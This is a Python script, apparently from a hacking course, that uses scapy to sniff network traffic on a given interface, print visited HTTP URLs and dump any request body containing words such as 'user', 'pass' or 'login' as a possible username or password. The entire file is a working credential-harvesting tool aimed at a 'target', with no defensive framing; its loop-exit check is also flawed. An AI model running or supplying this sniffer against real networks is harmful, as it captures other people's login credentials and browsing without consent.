#!/usr/bin/env python
import optparse
import scapy.all as scapy
from colorama import Fore
from scapy.layers import http


def sniff(iface):
    print(f'[+] Sniffing started on {Fore.RED + iface + Fore.WHITE}. Waiting for target activity...')
    print('\n')
    scapy.sniff(iface=iface, store=False, prn=analyze_packet)


def analyze_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(Fore.LIGHTBLUE_EX + '[+] HTTP Request > ' + Fore.WHITE, end="")
        print(b'http://' + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        print('\n')

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['uname', 'username', 'user', 'pass', 'login', 'email', 'password']

            for word in keywords:
                if word in load.decode():
                    print(Fore.LIGHTGREEN_EX + '[+] Possible Username/Password > ' + Fore.WHITE, end="")
                    print(load.decode())
                    print('\n')
                    break


def get_options():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest='interface', help="Interface to sniff.")
    (option, argument) = parser.parse_args()

    if not option.interface:
        parser.error("[!] Interface expected. Try --help for more info.")

    return option


opt = get_options()
interface = opt.interface

while True:

    sniff(interface)

    if KeyboardInterrupt:
        print(f'\n[x] Sniffing stopped on {Fore.RED + interface + Fore.WHITE}. Exiting...')
        break
